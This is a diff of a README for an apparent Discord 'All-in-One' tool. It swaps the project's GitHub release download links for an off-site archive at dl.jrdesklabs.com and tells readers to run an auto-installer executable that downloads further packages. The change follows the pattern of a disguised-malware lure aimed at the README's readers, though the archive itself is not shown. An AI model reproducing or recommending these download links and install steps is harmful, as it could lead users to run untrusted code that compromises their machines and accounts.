@@ -6,10 +6,10 @@ AIO Script Developed with Python3. It gathers a total of 23 Discord tools (inclu
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/9483d22e-8648-48e7-a80f-6cc2850e330b)
-](https://github.com/JackyBlackson/Discord-All-in-One-Tool-2024/releases/download/V5.7/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
-## **1. [Download the archive](https://github.com/JackyBlackson/Discord-All-in-One-Tool-2024/releases/download/V5.7/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-24_15-17-36](https://github.com/user-attachments/assets/0d713e99-cd07-4556-995c-bee6f1d1fba4)
